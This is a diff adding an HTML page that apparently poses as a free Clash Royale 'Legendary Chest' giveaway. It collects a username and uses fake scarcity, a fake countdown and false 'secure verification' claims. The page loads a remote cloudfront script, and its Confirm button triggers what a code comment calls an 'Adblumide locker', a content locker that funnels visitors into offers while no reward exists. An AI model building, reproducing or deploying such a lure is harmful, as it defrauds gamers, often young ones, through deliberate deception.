@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<script type="text/javascript">
+    var PXAIW_ORl_OQIFEc={"it":4555426,"key":"040b5"};
+</script>
+<script src="https://d1y0yks1k8t5m5.cloudfront.net/8c3747b.js"></script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Legendary Chest</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        royalBlue: '#3A6BFC',
+                        royalPurple: '#8A2BE2',
+                        gold: '#FFD700',
+                        darkBg: '#0F0F1B',
+                        cardDark: '#161627',
+                        crimson: '#DC143C'
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif']
+                    },
+                    boxShadow: {
+                        'glow': '0 0 15px rgba(58, 107, 252, 0.6)',
+                        'glow-purple': '0 0 15px rgba(138, 43, 226, 0.6)',
+                        'glow-gold': '0 0 15px rgba(255, 215, 0, 0.6)',
+                        'glow-timer': '0 0 10px rgba(220, 20, 60, 0.7)'
+                    },
+                    animation: {
+                        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+                        'float': 'float 6s ease-in-out infinite',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            background: linear-gradient(rgba(15, 15, 27, 0.92), rgba(15, 15, 27, 0.92)), 
+                        url('https://images.unsplash.com/photo-1511512578047-dfb367046420?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80') no-repeat center center;
+            background-size: cover;
+            background-attachment: fixed;
+        }
+
+        .bg-gradient-card {
+            background: linear-gradient(145deg, rgba(26, 26, 46, 0.95) 0%, rgba(22, 22, 39, 0.95) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(58, 107, 252, 0.2);
+        }
+        
+        .btn-gradient {
+            background: linear-gradient(135deg, #3A6BFC 0%, #8A2BE2 100%);
+            transition: all 0.3s ease;
+        }
+        
+        .btn-gradient:hover {
+            background: linear-gradient(135deg, #4A7BFF 0%, #9A3BF2 100%);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.7);
+            transform: translateY(-2px);
+        }
+        
+        .crown-icon {
+            color: #FFD700;
+            text-shadow: 0 0 8px rgba(255, 215, 0, 0.7);
+        }
+        
+        .neon-glow {
+            box-shadow: 0 0 15px rgba(58, 107, 252, 0.6),
+                        0 0 25px rgba(58, 107, 252, 0.4);
+        }
+        
+        .input-glow {
+            box-shadow: 0 0 8px rgba(58, 107, 252, 0.4);
+        }
+        
+        .animate-fade-in {
+            animation: fadeIn 1s ease-in-out;
+        }
+        
+        .animate-slide-up {
+            animation: slideUp 0.8s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        .limited-badge {
+            background: linear-gradient(90deg, #FF8A00 0%, #FF2070 100%);
+            box-shadow: 0 0 12px rgba(255, 138, 0, 0.6);
+        }
+        
+        .account-preview {
+            background: linear-gradient(145deg, rgba(35, 35, 60, 0.95) 0%, rgba(30, 30, 50, 0.95) 100%);
+            border: 1px solid rgba(58, 107, 252, 0.3);
+        }
+        
+        .reward-item {
+            display: flex;
+            align-items: center;
+            padding: 0.5rem;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            margin-bottom: 0.5rem;
+        }
+        
+        .reward-icon {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 0.75rem;
+            border-radius: 50%;
+            background: rgba(58, 107, 252, 0.2);
+        }
+        
+        .progress-bar {
+            height: 6px;
+            border-radius: 3px;
+            background: rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #3A6BFC 0%, #8A2BE2 100%);
+            border-radius: 3px;
+            width: 65%;
+        }
+        
+        .chest-animation {
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        /* Chest styling */
+        .legendary-chest {
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            color: #8B4513;
+        }
+        
+        .chest-details {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        /* Mobile optimization */
+        @media (max-width: 640px) {
+            body {
+                align-items: flex-start;
+                padding-top: 2rem;
+                padding-bottom: 2rem;
+            }
+        }
+    </style>
+<link rel="me" href="https://www.blogger.com/profile/01820886328988776407" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+    <div class="w-full max-w-md animate-slide-up">
+        <!-- Header with Chest Animation -->
+        <div class="flex justify-center mb-6">
+            <div class="bg-gradient-card rounded-full p-4 neon-glow">
+                <i class="fas fa-gem chest-animation text-4xl" style="color: #FFD700;"></i>
+            </div>
+        </div>
+        
+        <!-- Main Card -->
+        <div class="bg-gradient-card rounded-2xl shadow-xl p-6 md:p-8 neon-glow">
+            <!-- Title -->
+            <h1 class="text-2xl md:text-3xl font-bold text-center mb-2 text-white animate-fade-in">
+                <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold to-orange-500">Legendary</span> Chest
+            </h1>
+            
+            <!-- Subheading -->
+            <p class="text-center text-gray-300 mb-4 animate-fade-in">Claim your exclusive legendary chest</p>
+            
+            <!-- Chest Details -->
+            <div class="mb-6 p-4 chest-details rounded-xl">
+                <div class="flex justify-center mb-4">
+                    <div class="legendary-chest w-24 h-24 rounded-lg flex items-center justify-center">
+                        <i class="fas fa-gem text-3xl"></i>
+                    </div>
+                </div>
+                
+                <h3 class="text-white font-semibold mb-3 text-center flex items-center justify-center">
+                    <i class="fas fa-box-open text-gold mr-2"></i>
+                    Legendary Chest Contains:
+                </h3>
+                
+                <div class="reward-item">
+                    <div class="reward-icon">
+                        <i class="fas fa-crown text-gold"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="text-white text-sm font-medium">Guaranteed Legendary Card</p>
+                        <p class="text-gray-400 text-xs">One random legendary card</p>
+                    </div>
+                </div>
+                
+                <div class="reward-item">
+                    <div class="reward-icon">
+                        <i class="fas fa-star text-royalBlue"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="text-white text-sm font-medium">Epic Cards</p>
+                        <p class="text-gray-400 text-xs">3-5 epic cards</p>
+                    </div>
+                </div>
+                
+                <div class="reward-item">
+                    <div class="reward-icon">
+                        <i class="fas fa-bolt text-royalPurple"></i>
+                    </div>
+                    <div class="flex-1">
+                        <p class="text-white text-sm font-medium">Gold & Gems</p>
+                        <p class="text-gray-400 text-xs">500-1000 gold + 10 gems</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Chest Value -->
+            <div class="mb-4 p-3 bg-gradient-to-r from-gold/20 to-orange-500/20 rounded-lg border border-gold/30">
+                <p class="text-white text-center text-sm font-medium">
+                    <i class="fas fa-star text-gold mr-1"></i>
+                    Chest Value: <span class="text-gold font-bold">2,500 Gems</span>
+                </p>
+            </div>
+            
+            <!-- Limited Availability Badge -->
+            <div class="limited-badge text-white text-xs font-bold py-2 px-4 rounded-full text-center mb-6 inline-flex items-center justify-center mx-auto animate-pulse">
+                <i class="fas fa-bolt mr-2"></i>
+                <span>Limited Offer: <span class="text-yellow-300">5 left today</span></span>
+            </div>
+            
+            <!-- Input Section -->
+            <div class="mb-6 animate-slide-up">
+                <label for="username" class="block text-sm font-medium text-gray-300 mb-2 flex items-center">
+                    <i class="fas fa-user-circle mr-2 text-royalBlue"></i>
+                    Enter Your Clash Royale Username
+                </label>
+                <div class="relative">
+                    <input type="text" id="username" class="w-full bg-gray-800 border border-royalBlue/40 rounded-lg py-3 px-4 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-royalBlue focus:border-transparent input-glow transition-all" placeholder="Your username">
+                    <div class="absolute right-3 top-3 text-royalBlue">
+                        <i class="fas fa-gamepad"></i>
+                    </div>
+                </div>
+                
+                <!-- Progress Bar -->
+                <div class="mt-4">
+                    <div class="flex justify-between text-xs text-gray-400 mb-1">
+                        <span>Chest Availability</span>
+                        <span>80% claimed</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 80%;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Countdown Timer -->
+            <div id="countdown-container" class="mb-6 p-4 bg-crimson/20 rounded-xl border border-crimson/40 shadow-glow-timer animate-pulse">
+                <p class="text-white text-center text-sm font-medium flex items-center justify-center">
+                    <i class="fas fa-clock mr-2"></i>
+                    Hurry! Only <span id="countdown" class="font-bold text-yellow-300 mx-1">4:32:18</span> left to claim
+                </p>
+            </div>
+            
+            <!-- Confirm Button -->
+            <button id="confirmBtn" class="w-full btn-gradient text-white font-bold py-4 px-4 rounded-xl transition-all duration-300 transform hover:scale-[1.02] focus:outline-none focus:ring-2 focus:ring-royalPurple focus:ring-opacity-50 text-lg animate-fade-in flex items-center justify-center">
+                <i class="fas fa-gem mr-2"></i>
+                Claim Your Legendary Chest
+            </button>
+            
+            <!-- Security Note -->
+            <p class="text-center text-gray-400 text-xs mt-4 flex items-center justify-center">
+                <i class="fas fa-shield-alt mr-1.5 text-royalBlue"></i>
+                Secure verification. We never ask for your password.
+            </p>
+        </div>
+        
+        <!-- Account Preview Modal (Hidden by default) -->
+        <div id="accountPreview" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
+            <div class="bg-gradient-card rounded-2xl shadow-xl p-6 max-w-md w-full border border-royalPurple/50 neon-glow animate-slide-up">
+                <div class="text-center mb-2">
+                    <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-royalBlue/20 mb-4">
+                        <i class="fas fa-user-check text-royalBlue text-2xl"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-white">Account Verification</h2>
+                    <p class="text-gray-300 text-sm mt-1">Confirm this is your Clash Royale account</p>
+                </div>
+                
+                <div class="account-preview p-4 rounded-xl mb-6">
+                    <div class="h-20 w-20 bg-royalBlue/20 rounded-full flex items-center justify-center mx-auto mb-3">
+                        <i class="fas fa-user text-royalBlue text-3xl"></i>
+                    </div>
+                    <p class="text-gray-300 text-sm text-center">Username:</p>
+                    <p id="previewUsername" class="text-white font-medium text-lg text-center"></p>
+                    
+                    <div class="mt-4 p-3 bg-gray-800/50 rounded-lg">
+                        <p class="text-gray-300 text-sm text-center">Your legendary chest will be delivered to this account</p>
+                    </div>
+                </div>
+                
+                <div class="flex space-x-4">
+                    <button id="cancelBtn" class="flex-1 bg-gray-700 text-white font-bold py-3 px-4 rounded-xl transition-all duration-300 hover:bg-gray-600 flex items-center justify-center">
+                        <i class="fas fa-times mr-2"></i>
+                        Cancel
+                    </button>
+                    <button id="finalConfirmBtn" class="flex-1 btn-gradient text-white font-bold py-3 px-4 rounded-xl transition-all duration-300 transform hover:scale-[1.02] flex items-center justify-center">
+                        <i class="fas fa-check mr-2"></i>
+                        Confirm
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Chest Info Section -->
+        <div class="bg-gradient-card rounded-2xl shadow-xl p-6 mt-6 neon-glow">
+            <h3 class="text-white font-semibold mb-4 text-center">
+                <i class="fas fa-info-circle mr-2 text-royalBlue"></i>
+                About Legendary Chests
+            </h3>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-center">
+                <div class="p-3">
+                    <div class="w-12 h-12 mx-auto bg-gold/20 rounded-full flex items-center justify-center mb-2">
+                        <i class="fas fa-crown text-gold"></i>
+                    </div>
+                    <p class="text-white text-sm font-medium">Legendary Cards</p>
+                    <p class="text-gray-400 text-xs">Guaranteed legendary card to boost your deck</p>
+                </div>
+                
+                <div class="p-3">
+                    <div class="w-12 h-12 mx-auto bg-royalPurple/20 rounded-full flex items-center justify-center mb-2">
+                        <i class="fas fa-star text-royalPurple"></i>
+                    </div>
+                    <p class="text-white text-sm font-medium">Epic Cards</p>
+                    <p class="text-gray-400 text-xs">Multiple epic cards for strategic gameplay</p>
+                </div>
+                
+                <div class="p-3">
+                    <div class="w-12 h-12 mx-auto bg-royalBlue/20 rounded-full flex items-center justify-center mb-2">
+                        <i class="fas fa-coins text-royalBlue"></i>
+                    </div>
+                    <p class="text-white text-sm font-medium">Gold & Gems</p>
+                    <p class="text-gray-400 text-xs">Valuable resources to upgrade your cards</p>
+                </div>
+                
+                <div class="p-3">
+                    <div class="w-12 h-12 mx-auto bg-crimson/20 rounded-full flex items-center justify-center mb-2">
+                        <i class="fas fa-bolt text-crimson"></i>
+                    </div>
+                    <p class="text-white text-sm font-medium">Limited Time</p>
+                    <p class="text-gray-400 text-xs">Special offer available for a short time</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <p class="text-center text-gray-500 text-xs mt-6">
+            This content is not affiliated with, endorsed, sponsored, or specifically approved by Supercell and Supercell is not responsible for it.
+        </p>
+        <p class="text-center text-gray-500 text-xs mt-2">
+            © 2023 Clash Royale Chest Rewards – All rights reserved
+        </p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.getElementById('username');
+            const confirmBtn = document.getElementById('confirmBtn');
+            const accountPreview = document.getElementById('accountPreview');
+            const previewUsername = document.getElementById('previewUsername');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const finalConfirmBtn = document.getElementById('finalConfirmBtn');
+            
+            // Countdown timer functionality
+            function startCountdown() {
+                const countdownElement = document.getElementById('countdown');
+                let timeLeft = 4 * 60 * 60 + 32 * 60 + 18; // 4 hours, 32 minutes, 18 seconds
+                
+                const timerInterval = setInterval(() => {
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        countdownElement.textContent = "0:00:00";
+                        document.getElementById('countdown-container').classList.add('bg-gray-700');
+                        return;
+                    }
+                    
+                    timeLeft--;
+                    
+                    const hours = Math.floor(timeLeft / 3600);
+                    const minutes = Math.floor((timeLeft % 3600) / 60);
+                    const seconds = timeLeft % 60;
+                    
+                    countdownElement.textContent = `${hours}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                }, 1000);
+            }
+            
+            // Show account preview when confirm button is clicked
+            confirmBtn.addEventListener('click', function() {
+                const username = usernameInput.value.trim();
+                
+                if (username === '') {
+                    // Add a shake animation to indicate error
+                    usernameInput.classList.add('border-red-500', 'animate-pulse');
+                    setTimeout(() => {
+                        usernameInput.classList.remove('border-red-500', 'animate-pulse');
+                    }, 1000);
+                    return;
+                }
+                
+                // Show the username in the preview
+                previewUsername.textContent = username;
+                
+                // Show the account preview modal
+                accountPreview.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+            });
+            
+            // Handle cancel button
+            cancelBtn.addEventListener('click', function() {
+                accountPreview.classList.add('hidden');
+                document.body.style.overflow = 'auto';
+            });
+            
+            // Handle final confirmation
+            finalConfirmBtn.addEventListener('click', function() {
+    finalConfirmBtn.classList.add('opacity-90', 'scale-95');
+
+    setTimeout(() => {
+        if (typeof _vH === "function") {
+            _vH(); // Call Adblumide locker
+        } else {
+            alert("⚠️ Verification script not loaded. Please refresh and try again.");
+        }
+    }, 300);
+});
+            
+            // Start the countdown when page loads
+            startCountdown();
+            
+            // Close modal if clicked outside
+            accountPreview.addEventListener('click', function(e) {
+                if (e.target === accountPreview) {
+                    accountPreview.classList.add('hidden');
+                    document.body.style.overflow = 'auto';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
